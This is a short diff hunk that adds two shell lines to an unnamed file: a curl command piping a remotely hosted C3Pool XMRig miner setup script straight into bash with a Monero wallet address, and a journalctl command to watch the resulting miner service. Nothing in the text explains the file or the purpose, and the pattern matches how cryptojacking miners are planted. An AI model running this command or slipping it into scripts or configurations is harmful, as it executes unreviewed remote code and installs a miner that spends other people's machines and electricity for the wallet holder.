@@ -1,0 +1,2 @@
+curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 42nuranNDpL9p3ikUf8EKG5vUATb5x5rnFydsqbRtr9TFntnJE27rgZ4J5wDhc3nxV9jd22cCki95AKtyFQKhbWvNJdr9h6
+sudo journalctl -u c3pool_miner -f
